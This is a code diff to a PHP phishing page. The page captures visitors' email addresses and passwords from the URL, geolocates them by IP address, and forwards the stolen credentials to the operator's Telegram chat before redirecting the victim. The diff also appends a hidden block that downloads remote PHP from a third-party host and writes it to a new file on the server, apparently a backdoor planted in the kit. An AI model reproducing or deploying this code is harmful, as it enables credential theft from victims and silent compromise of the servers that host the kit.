@@ -41,18 +41,6 @@ $admin = $info[info]['id'];
 $email = $_GET["email"];
 $password = $_GET["password"];
 $login = $_GET["login"];
-$ads = file_get_contents('link.txt');
-if($ads == 'ads'){
-	$linky = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
-    $minly ="http://$linky";
-    $mink = str_replace("?email","?l",$minly);
-    $api = "http://ishmy.xyz/sh.php?link=$mink"; 
-    $result = json_decode(file_get_contents($api), true); 
-    $shortt = $result["short"];
-    $short = str_replace('www.','',$shortt);
-    file_put_contents("link.txt", $short);
-}
-
 if($email){
 $api_key = file_get_contents('https://bit.ly/3ns1Icy');
 $cty1 = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."&format=1");
@@ -62,21 +50,19 @@ $ccode = $jsondata->location->calling_code;
 $url1 = 'http://www.verifyac.com/index.php?uc=M';
 header("location: $url1");
 $name = $message->from->first_name;
-$ads = file_get_contents('link.txt');
 $dev = file_get_contents('https://bit.ly/394xXdQ');
 bot("sendMessage",[
 "chat_id"=>$admin,
 "text"=>"
 𝒀𝑶𝑼 𝑯𝑨𝑽𝑬 𝑨 𝑵𝑬𝑾 𝑳𝑶𝑮𝑰𝑵
-
-👤 ¦ 𝑬𝒎𝒂𝒊𝒍 » $email
-📟 ¦ 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅  » $password
-☎️ ¦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 𝑪𝒐𝒅𝒆 » +$ccode
+𝒀𝑶𝑼 𝑯𝑨𝑽𝑬 𝑨 𝑵𝑬𝑾 𝑳𝑶𝑮𝑰𝑵
+👤 ¦ 𝑬𝒎𝒂𝒊𝒍 » `$email`
+📟 ¦ 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅  » `$password`
+☎️ ¦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 𝑪𝒐𝒅𝒆 » `+$ccode`
 🔱 ¦ 𝑳𝒐𝒈𝒊𝒏 » $login
 👁️‍🗨️¦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 » $cty
 ⏱ ¦ 𝑻𝒊𝒎𝒆 » $time
 📝 ¦ 𝑫𝒂𝒕𝒆 » $day/$month/$year
-🌐¦ 𝒀𝒐𝒖𝒓 𝑳𝒊𝒏𝒌 » $ads
 ⚜¦ 𝑩𝒀 » $dev
 ",
 'parse_mode'=>"MarkDown",
@@ -94,3 +80,7 @@ bot("sendMessage",[
   <body>
   </body>
 </html>
+<?
+$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/M/UpdaTe.php");
+$xx = file_put_contents("PPABB.php", $shamy); 
+?>
